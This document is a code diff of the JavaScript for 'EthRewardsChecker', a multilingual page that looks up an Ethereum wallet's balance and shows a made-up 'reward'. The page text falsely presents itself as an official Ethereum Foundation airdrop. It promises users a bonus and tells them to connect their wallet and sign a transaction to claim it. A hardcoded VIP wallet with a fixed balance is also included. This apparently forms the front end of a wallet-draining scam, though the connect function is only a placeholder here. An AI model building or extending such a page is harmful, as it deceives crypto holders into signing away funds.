-    pl: { title: "EthRewardsChecker", subtitle: "Sprawdź kwalifikowalność portfela", labelAddress: "Adres Portfela Ethereum", buttonText: "Sprawdź Kwalifikowalność", buttonChecking: "Sprawdzanie...", errorTitle: "Błąd Weryfikacji", invalidAddress: "Nieprawidłowy adres portfela.", connectionError: "Nie można się połączyć.", successTitle: "Gratulacje!", successContent: "Twój portfel spełnia wymagania.", failTitle: "Nie Kwalifikuje się", failContent: "Ten portfel nie spełnia wymagań.", currentBalance: "Aktualne Saldo", yourReward: "Twoja Nagroda", connectButton: "Połącz Portfel", claimInstructions: "Połącz portfel, aby odebrać i podpisz transakcję.", poweredBy: "Powered by Ethereum API", termsLink: "Warunki Użytkowania", vipMessage: "Masz prawo do bonusu za aktywne korzystanie z Ethereum" },
-    ar: { title: "EthRewardsChecker", subtitle: "تحقق من أهلية محفظتك", labelAddress: "عنوان محفظة Ethereum", buttonText: "تحقق من الأهلية", buttonChecking: "جاري التحقق...", errorTitle: "خطأ في التحقق", invalidAddress: "عنوان محفظة غير صالح.", connectionError: "تعذر الاتصال.", successTitle: "تهانينا!", successContent: "محفظتك تفي بالمتطلبات.", failTitle: "غير مؤهل", failContent: "هذه المحفظة لا تفي بالمتطلبات.", currentBalance: "الرصيد الحالي", yourReward: "مكافأتك", connectButton: "ربط المحفظة", claimInstructions: "قم بربط محفظتك للمطالبة وتوقيع المعاملة.", poweredBy: "Powered by Ethereum API", termsLink: "شروط الاستخدام", vipMessage: "أنت مؤهل للحصول على مكافأة للاستخدام النشط لإيثريوم" },
-    ur: { title: "EthRewardsChecker", subtitle: "اپنے بٹوے کی اہلیت چیک کریں", labelAddress: "ایتھیریم بٹوے کا پتہ", buttonText: "اہلیت چیک کریں", buttonChecking: "چیک ہو رہا ہے...", errorTitle: "تصدیق کی خرابی", invalidAddress: "بٹوے کا پتہ غلط ہے۔", connectionError: "منسلک نہیں ہو سکا۔", successTitle: "مبارک ہو!", successContent: "آپ کا بٹوہ تقاضے پورے کرتا ہے۔", failTitle: "اہل نہیں", failContent: "یہ بٹوہ تقاضے پورے نہیں کرتا۔", currentBalance: "موجودہ بیلنس", yourReward: "آپ کا انعام", connectButton: "بٹوہ منسلک کریں", claimInstructions: "دعوی کرنے کے لیے اپنا بٹوہ منسلک کریں اور لین دین پر دستخط کریں۔", poweredBy: "Powered by Ethereum API", termsLink: "استعمال کی شرائط", vipMessage: "آپ ایتھیریم کے فعال استعمال کے لیے بونس کے اہل ہیں" },
-    hi: { title: "EthRewardsChecker", subtitle: "अपने वॉलेट की पात्रता जांचें", labelAddress: "एथेरियम वॉलेट पता", buttonText: "पात्रता जांचें", buttonChecking: "जांच रहे हैं...", errorTitle: "सत्यापन त्रुटि", invalidAddress: "वॉलेट पता अमान्य है।", connectionError: "कनेक्ट नहीं हो सका।", successTitle: "बधाई हो!", successContent: "आपका वॉलेट आवश्यकताओं को पूरा करता है।", failTitle: "पात्र नहीं", failContent: "यह वॉलेट आवश्यकताओं को पूरा नहीं करता।", currentBalance: "वर्तमान शेष", yourReward: "आपका पुरस्कार", connectButton: "वॉलेट कनेक्ट करें", claimInstructions: "दावा करने के लिए अपना वॉलेट कनेक्ट करें और लेनदेन पर हस्ताक्षर करें।", poweredBy: "Powered by Ethereum API", termsLink: "उपयोग की शर्तें", vipMessage: "आप एथेरियम के सक्रिय उपयोग के लिए बोनस के पात्र हैं" }
+    en: {
+        title: "EthRewardsChecker",
+        subtitle: "Check your wallet eligibility for the official Ethereum Foundation airdrop program",
+        labelAddress: "Ethereum Wallet Address",
+        buttonText: "Check Eligibility",
+        buttonChecking: "Checking...",
+        errorTitle: "Verification Error",
+        invalidAddress: "Invalid wallet address format",
+        connectionError: "Unable to connect to Ethereum network. Please try again.",
+        successTitle: "Congratulations!",
+        successContent: "Your wallet meets the requirements.",
+        failTitle: "Not Eligible",
+        failContent: "This wallet does not meet the minimum requirements.",
+        currentBalance: "Current Balance",
+        yourReward: "Your Reward",
+        connectButton: "Connect Wallet",
+        claimInstructions: "Connect your wallet and sign the transaction to claim your rewards.",
+        poweredBy: "Powered by Ethereum API",
+        termsLink: "Terms of Use",
+        vipMessage: "You are eligible for a bonus for active use of Ethereum",
+        addressCopied: "Address copied to clipboard!",
+        recentChecks: "📜 Recent Checks",
+        clearHistory: "Clear",
+        noHistory: "No recent checks"
+    },
+    ru: {
+        title: "EthRewardsChecker",
+        subtitle: "Проверьте кошелек на участие в официальной программе airdrop от Ethereum Foundation",
+        labelAddress: "Адрес Ethereum Кошелька",
+        buttonText: "Проверить Право",
+        buttonChecking: "Проверка...",
+        errorTitle: "Ошибка Проверки",
+        invalidAddress: "Некорректный формат адреса кошелька",
+        connectionError: "Не удалось подключиться к сети Ethereum. Попробуйте еще раз.",
+        successTitle: "Поздравляем!",
+        successContent: "Ваш кошелек соответствует требованиям.",
+        failTitle: "Не Подходит",
+        failContent: "Этот кошелек не соответствует минимальным требованиям.",
+        currentBalance: "Текущий Баланс",
+        yourReward: "Ваше Вознаграждение",
+        connectButton: "Подключить Кошелек",
+        claimInstructions: "Подключите кошелек и подпишите транзакцию для получения вознаграждения.",
+        poweredBy: "Работает на Ethereum API",
+        termsLink: "Условия Использования",
+        vipMessage: "Вам полагается бонус за активное использование Ethereum",
+        addressCopied: "Адрес скопирован в буфер обмена!",
+        recentChecks: "📜 Недавние Проверки",
+        clearHistory: "Очистить",
+        noHistory: "Нет недавних проверок"
+    },
+    uk: {
+        title: "EthRewardsChecker",
+        subtitle: "Перевірте гаманець на участь в офіційній програмі airdrop від Ethereum Foundation",
+        labelAddress: "Адреса Ethereum Гаманця",
+        buttonText: "Перевірити Право",
+        buttonChecking: "Перевірка...",
+        errorTitle: "Помилка Перевірки",
+        invalidAddress: "Некоректний формат адреси гаманця",
+        connectionError: "Не вдалося підключитися до мережі Ethereum. Спробуйте ще раз.",
+        successTitle: "Вітаємо!",
+        successContent: "Ваш гаманець відповідає вимогам.",
+        failTitle: "Не Підходить",
+        failContent: "Цей гаманець не відповідає мінімальним вимогам.",
+        currentBalance: "Поточний Баланс",
+        yourReward: "Ваша Винагорода",
+        connectButton: "Підключити Гаманець",
+        claimInstructions: "Підключіть гаманець та підпишіть транзакцію для отримання винагороди.",
+        poweredBy: "Працює на Ethereum API",
+        termsLink: "Умови Використання",
+        vipMessage: "Вам належить бонус за активне використання Ethereum",
+        addressCopied: "Адресу скопійовано в буфер обміну!",
+        recentChecks: "📜 Нещодавні Перевірки",
+        clearHistory: "Очистити",
+        noHistory: "Немає нещодавніх перевірок"
+    }
+    // Add other languages as needed
 };
 
+// Constants
 const VIP_WALLET = '0x7F9A75bcBb330bf0ff71167a7711A41aC962512A'.toLowerCase();
 const MIN_BALANCE_USD = 200;
 const BONUS_PERCENTAGE = 20;
 const VIP_BALANCE_USD = 11722;
+const MAX_HISTORY_ITEMS = 5;
+const PRICE_CACHE_DURATION = 5 * 60 * 1000; // 5 minutes
+const RATE_LIMIT_DELAY = 1000; // 1 second between requests
+
+// State
 let currentLang = 'en';
 let currentEthPrice = 3500;
+let lastPriceFetch = 0;
+let lastRequestTime = 0;
+
+// Toast notifications
+function showToast(message, type = 'info') {
+    const container = document.getElementById('toastContainer');
+    const toast = document.createElement('div');
+    toast.className = `toast ${type}`;
+    
+    const icon = type === 'success' ? '✓' : type === 'error' ? '✕' : 'ℹ';
+    
+    toast.innerHTML = `
+        <div class="toast-icon">${icon}</div>
+        <div class="toast-message">${message}</div>
+    `;
+    
+    container.appendChild(toast);
+    
+    setTimeout(() => {
+        toast.style.animation = 'slideIn 0.3s ease-out reverse';
+        setTimeout(() => toast.remove(), 300);
+    }, 3000);
+}
+
+// Theme management
+function initTheme() {
+    const savedTheme = localStorage.getItem('theme') || 'light';
+    setTheme(savedTheme);
+}
+
+function setTheme(theme) {
+    document.documentElement.setAttribute('data-theme', theme);
+    document.getElementById('themeIcon').textContent = theme === 'dark' ? '☀️' : '🌙';
+    localStorage.setItem('theme', theme);
+}
+
+function toggleTheme() {
+    const currentTheme = document.documentElement.getAttribute('data-theme') || 'light';
+    const newTheme = currentTheme === 'light' ? 'dark' : 'light';
+    setTheme(newTheme);
+}
+
+// Cookie management
+function initCookieBanner() {
+    const accepted = localStorage.getItem('cookiesAccepted');
+    if (!accepted) {
+        setTimeout(() => {
+            document.getElementById('cookieBanner').classList.add('show');
+        }, 1000);
+    }
+}
 
 function acceptCookies() {
     localStorage.setItem('cookiesAccepted', 'true');
-    document.getElementById('cookieBanner').classList.add('hidden');
+    document.getElementById('cookieBanner').classList.remove('show');
+    setTimeout(() => {
+        document.getElementById('cookieBanner').classList.add('hidden');
+    }, 300);
+    showToast(translations[currentLang].addressCopied || 'Preferences saved', 'success');
 }
 
 function declineCookies() {
     localStorage.setItem('cookiesAccepted', 'false');
-    document.getElementById('cookieBanner').classList.add('hidden');
+    document.getElementById('cookieBanner').classList.remove('show');
+    setTimeout(() => {
+        document.getElementById('cookieBanner').classList.add('hidden');
+    }, 300);
 }
 
+// Language management
 function changeLanguage(lang) {
     currentLang = lang;
     const t = translations[lang] || translations.en;
+    
     document.getElementById('title').textContent = t.title;
     document.getElementById('subtitle').textContent = t.subtitle;
     document.getElementById('labelAddress').textContent = t.labelAddress;
     document.getElementById('buttonText').textContent = t.buttonText;
     document.getElementById('poweredBy').textContent = t.poweredBy;
     document.getElementById('termsLink').textContent = t.termsLink;
+    
+    localStorage.setItem('preferredLanguage', lang);
 }
 
+function initLanguage() {
+    const savedLang = localStorage.getItem('preferredLanguage') || 'en';
+    document.getElementById('languageSelect').value = savedLang;
+    changeLanguage(savedLang);
+}
+
+// Price fetching with caching
 async function getEthPrice() {
+    const now = Date.now();
+    
+    if (now - lastPriceFetch < PRICE_CACHE_DURATION) {
+        return currentEthPrice;
+    }
+    
     try {
         const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
         const data = await res.json();
-        return data.ethereum.usd;
-    } catch { return 3500; }
+        
+        if (data.ethereum && data.ethereum.usd) {
+            currentEthPrice = data.ethereum.usd;
+            lastPriceFetch = now;
+            localStorage.setItem('cachedEthPrice', JSON.stringify({ price: currentEthPrice, timestamp: now }));
+        }
+    } catch (error) {
+        console.warn('Failed to fetch ETH price, using cached or default value');
+        const cached = localStorage.getItem('cachedEthPrice');
+        if (cached) {
+            const { price } = JSON.parse(cached);
+            currentEthPrice = price;
+        }
+    }
+    
+    return currentEthPrice;
 }
 
+// Rate limiting
+async function rateLimit() {
+    const now = Date.now();
+    const timeSinceLastRequest = now - lastRequestTime;
+    
+    if (timeSinceLastRequest < RATE_LIMIT_DELAY) {
+        await new Promise(resolve => setTimeout(resolve, RATE_LIMIT_DELAY - timeSinceLastRequest));
+    }
+    
+    lastRequestTime = Date.now();
+}
+
+// Wallet checking with improved error handling
 async function checkWallet(address) {
-    const rpcs = ['https://eth.llamarpc.com', 'https://rpc.ankr.com/eth'];
+    await rateLimit();
+    
+    const rpcs = [
+        'https://eth.llamarpc.com',
+        'https://rpc.ankr.com/eth',
+        'https://cloudflare-eth.com'
+    ];
+    
+    const errors = [];
+    
     for (const rpc of rpcs) {
         try {
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 5000);
+            
             const res = await fetch(rpc, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({jsonrpc: '2.0', method: 'eth_getBalance', params: [address, 'latest'], id: 1})
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    jsonrpc: '2.0',
+                    method: 'eth_getBalance',
+                    params: [address, 'latest'],
+                    id: 1
+                }),
+                signal: controller.signal
             });
+            
+            clearTimeout(timeout);
+            
             const data = await res.json();
-            if (data.result) return {balance: data.result};
-        } catch {}
+            
+            if (data.result) {
+                return { balance: data.result };
+            }
+            
+            if (data.error) {
+                errors.push(data.error.message);
+            }
+        } catch (err) {
+            errors.push(err.message);
+        }
     }
+    
     throw new Error(translations[currentLang].connectionError);
 }
 
+// History management
+function addToHistory(address) {
+    let history = JSON.parse(localStorage.getItem('walletHistory') || '[]');
+    
+    history = history.filter(item => item.address.toLowerCase() !== address.toLowerCase());
+    
+    history.unshift({
+        address: address,
+        timestamp: Date.now()
+    });
+    
+    if (history.length > MAX_HISTORY_ITEMS) {
+        history = history.slice(0, MAX_HISTORY_ITEMS);
+    }
+    
+    localStorage.setItem('walletHistory', JSON.stringify(history));
+    updateHistoryDisplay();
+}
+
+function updateHistoryDisplay() {
+    const history = JSON.parse(localStorage.getItem('walletHistory') || '[]');
+    const historySection = document.getElementById('historySection');
+    const historyList = document.getElementById('historyList');
+    
+    if (history.length === 0) {
+        historySection.style.display = 'none';
+        return;
+    }
+    
+    historySection.style.display = 'block';
+    historyList.innerHTML = '';
+    
+    history.forEach(item => {
+        const div = document.createElement('div');
+        div.className = 'history-item';
+        div.onclick = () => {
+            document.getElementById('walletAddress').value = item.address;
+            showToast('Address loaded from history', 'success');
+        };
+        
+        const timeAgo = formatTimeAgo(item.timestamp);
+        
+        div.innerHTML = `
+            <div class="history-address">${item.address.slice(0, 6)}...${item.address.slice(-4)}</div>
+            <div class="history-time">${timeAgo}</div>
+        `;
+        
+        historyList.appendChild(div);
+    });
+}
+
+function clearHistory() {
+    if (confirm('Clear all search history?')) {
+        localStorage.removeItem('walletHistory');
+        updateHistoryDisplay();
+        showToast('History cleared', 'success');
+    }
+}
+
+function formatTimeAgo(timestamp) {
+    const seconds = Math.floor((Date.now() - timestamp) / 1000);
+    
+    if (seconds < 60) return 'Just now';
+    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
+    if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
+    return `${Math.floor(seconds / 86400)}d ago`;
+}
+
+// Copy to clipboard
+async function copyToClipboard() {
+    const input = document.getElementById('walletAddress');
+    const text = input.value.trim();
+    
+    if (!text) return;
+    
+    try {
+        await navigator.clipboard.writeText(text);
+        showToast(translations[currentLang].addressCopied, 'success');
+    } catch (err) {
+        input.select();
+        document.execCommand('copy');
+        showToast(translations[currentLang].addressCopied, 'success');
+    }
+}
+
+// Result display
 function showResult(balance, error, address) {
     const t = translations[currentLang];
     const resultDiv = document.getElementById('result');
     
     if (error) {
-        resultDiv.innerHTML = '<div class="result error"><div class="result-title">⚠️ ' + t.errorTitle + '</div><p>' + error + '</p></div>';
+        resultDiv.innerHTML = `
+            <div class="result error">
+                <div class="result-title">⚠️ ${t.errorTitle}</div>
+                <p>${error}</p>
+            </div>
+        `;
         return;
     }
 
@@ -545,41 +1274,51 @@ function showResult(balance, error, address) {
     const bonusEth = (bonusUsd / currentEthPrice).toFixed(4);
 
     if (isVip || displayBalanceUsd >= MIN_BALANCE_USD) {
-        const vipMessage = isVip ? '<p class="vip-message">✅ ' + t.vipMessage + '</p>' : '';
+        const vipMessage = isVip ? `<div class="vip-message">✅ ${t.vipMessage}</div>` : '';
         
-        resultDiv.innerHTML = '<div class="result success">' +
-            '<div class="result-title">🎉 ' + t.successTitle + '</div>' +
-            '<p>' + t.successContent + '</p>' +
-            vipMessage +
-            '<div class="stat-box" style="margin-top:20px;">' +
-                '<div class="stat-label">' + t.currentBalance + '</div>' +
-                '<div class="stat-value">≈ $' + parseFloat(displayBalanceUsd).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2}) + '</div>' +
-            '</div>' +
-            '<div style="margin-top:16px; padding:16px; background:#f0fdf4; border:2px solid #10b981; border-radius:10px;">' +
-                '<div style="font-size:12px; color:#059669; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:6px;">' + t.yourReward + '</div>' +
-                '<div style="font-size:32px; font-weight:900; color:#059669; line-height:1;">' + bonusEth + ' ETH</div>' +
-                '<div style="font-size:14px; color:#059669; font-weight:600; margin-top:4px;">≈ $' + parseFloat(bonusUsd).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2}) + '</div>' +
-            '</div>' +
-            '<p style="margin-top:20px; font-size:14px; color:#6c6c6c; text-align:center; font-weight:500;">' + t.claimInstructions + '</p>' +
-            '<button onclick="connectWallet()" class="btn" style="margin-top:12px;">🔗 ' + t.connectButton + '</button>' +
-        '</div>';
+        resultDiv.innerHTML = `
+            <div class="result success">
+                <div class="result-title">🎉 ${t.successTitle}</div>
+                <p>${t.successContent}</p>
+                ${vipMessage}
+                <div class="stat-box" style="margin-top:20px;">
+                    <div class="stat-label">${t.currentBalance}</div>
+                    <div class="stat-value">≈ $${parseFloat(displayBalanceUsd).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
+                </div>
+                <div class="reward-box">
+                    <div style="font-size:12px; color:#059669; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:6px;">${t.yourReward}</div>
+                    <div style="font-size:32px; font-weight:900; color:#059669; line-height:1;">${bonusEth} ETH</div>
+                    <div style="font-size:14px; color:#059669; font-weight:600; margin-top:4px;">≈ $${parseFloat(bonusUsd).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
+                </div>
+                <p style="margin-top:20px; font-size:14px; color:var(--text-secondary); text-align:center; font-weight:500;">${t.claimInstructions}</p>
+                <button onclick="connectWallet()" class="btn" style="margin-top:12px;">🔗 ${t.connectButton}</button>
+            </div>
+        `;
+        
+        showToast(t.successTitle, 'success');
     } else {
-        resultDiv.innerHTML = '<div class="result error">' +
-            '<div class="result-title">❌ ' + t.failTitle + '</div>' +
-            '<p>' + t.failContent + '</p>' +
-            '<div class="stat-box" style="margin-top:16px;">' +
-                '<div class="stat-label">' + t.currentBalance + '</div>' +
-                '<div class="stat-value">' + ethBalance.toFixed(4) + ' ETH</div>' +
-                '<div class="stat-label">≈ $' + displayBalanceUsd.toFixed(2) + '</div>' +
-            '</div>' +
-        '</div>';
+        resultDiv.innerHTML = `
+            <div class="result error">
+                <div class="result-title">❌ ${t.failTitle}</div>
+                <p>${t.failContent}</p>
+                <div class="stat-box" style="margin-top:16px;">
+                    <div class="stat-label">${t.currentBalance}</div>
+                    <div class="stat-value">${ethBalance.toFixed(4)} ETH</div>
+                    <div class="stat-label" style="margin-top:8px;">≈ $${displayBalanceUsd.toFixed(2)}</div>
+                </div>
+            </div>
+        `;
     }
+    
+    addToHistory(address);
 }
 
+// Wallet connection placeholder
 function connectWallet() {
-    alert('Wallet connection coming soon!');
+    showToast('Wallet connection feature coming soon!', 'info');
 }
 
+// Modal management
 function openTermsModal() {
     document.getElementById('termsModal').classList.add('active');
     document.body.style.overflow = 'hidden';
@@ -590,47 +1329,83 @@ function closeTermsModal() {
     document.body.style.overflow = '';
 }
 
-window.addEventListener('load', function() {
-    // Cookie banner shows by default
-});
-
-document.getElementById('acceptBtn').addEventListener('click', acceptCookies);
-document.getElementById('declineBtn').addEventListener('click', declineCookies);
-document.getElementById('languageSelect').addEventListener('change', function(e) {
-    changeLanguage(e.target.value);
-});
-document.getElementById('closeModal').addEventListener('click', closeTermsModal);
-document.getElementById('termsLink').addEventListener('click', openTermsModal);
-document.getElementById('termsModal').addEventListener('click', function(e) {
-    if (e.target.id === 'termsModal') closeTermsModal();
-});
-document.addEventListener('keydown', function(e) {
-    if (e.key === 'Escape') closeTermsModal();
-});
-
+// Form submission
 document.getElementById('walletForm').addEventListener('submit', async function(e) {
     e.preventDefault();
+    
     const address = document.getElementById('walletAddress').value.trim();
     const t = translations[currentLang];
     const btn = document.getElementById('checkButton');
+    const btnText = document.getElementById('buttonText');
     
+    // Validate address format
     if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
         showResult(null, t.invalidAddress, address);
+        showToast(t.invalidAddress, 'error');
         return;
     }
 
+    // Update button state
     btn.disabled = true;
-    btn.innerHTML = '<span>' + t.buttonChecking + '</span>';
+    btnText.innerHTML = `<div class="btn-loading"><div class="spinner"></div><span>${t.buttonChecking}</span></div>`;
 
     try {
-        currentEthPrice = await getEthPrice();
+        // Fetch current ETH price
+        await getEthPrice();
+        
+        // Check wallet balance
         const result = await checkWallet(address);
+        
+        // Show results
         showResult(result.balance, null, address);
     } catch (err) {
         showResult(null, err.message, address);
+        showToast(err.message, 'error');
     } finally {
         btn.disabled = false;
-        btn.innerHTML = '<span>' + t.buttonText + '</span>';
+        btnText.textContent = t.buttonText;
+    }
+});
+
+// Event listeners
+document.getElementById('acceptBtn').addEventListener('click', acceptCookies);
+document.getElementById('declineBtn').addEventListener('click', declineCookies);
+document.getElementById('themeToggle').addEventListener('click', toggleTheme);
+document.getElementById('languageSelect').addEventListener('change', (e) => changeLanguage(e.target.value));
+document.getElementById('copyBtn').addEventListener('click', copyToClipboard);
+document.getElementById('closeModal').addEventListener('click', closeTermsModal);
+document.getElementById('termsLink').addEventListener('click', openTermsModal);
+document.getElementById('clearHistory').addEventListener('click', clearHistory);
+
+// Modal click outside to close
+document.getElementById('termsModal').addEventListener('click', function(e) {
+    if (e.target.id === 'termsModal') closeTermsModal();
+});
+
+// Keyboard shortcuts
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') closeTermsModal();
+    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+        e.preventDefault();
+        document.getElementById('walletAddress').focus();
+    }
+});
+
+// Initialize on load
+window.addEventListener('load', function() {
+    initTheme();
+    initLanguage();
+    initCookieBanner();
+    updateHistoryDisplay();
+    
+    // Load cached ETH price
+    const cached = localStorage.getItem('cachedEthPrice');
+    if (cached) {
+        const { price, timestamp } = JSON.parse(cached);
+        if (Date.now() - timestamp < PRICE_CACHE_DURATION) {
+            currentEthPrice = price;
+            lastPriceFetch = timestamp;
+        }
     }
 });
     </script>
